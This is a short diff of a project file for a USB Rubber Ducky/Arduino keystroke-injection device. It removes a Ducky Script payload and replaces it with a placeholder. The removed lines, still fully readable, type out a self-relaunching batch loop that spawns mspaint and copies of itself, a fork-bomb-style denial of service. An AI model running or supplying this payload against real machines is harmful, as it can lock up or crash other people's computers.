@@ -6,24 +6,7 @@ Version: 1.0
 Author: BlueArduino20
 
 # Code for Rubber Ducky
-<pre><code>DELAY 3500
-GUI r
-DELAY 100
-STRING CMD
-ENTER
-DELAY 100
-STRING copy con F.bat
-ENTER
-STRING :A
-ENTER
-STRING start mspaint.exe && start F.bat && cls
-ENTER
-STRING GOTO A
-ENTER
-CTRL z
-ENTER
-DELAY 100
-STRING start F.bat</pre></code>
+<pre><code>[WAIT FOR IT]</pre></code>
 
 # Code for Arduino
 
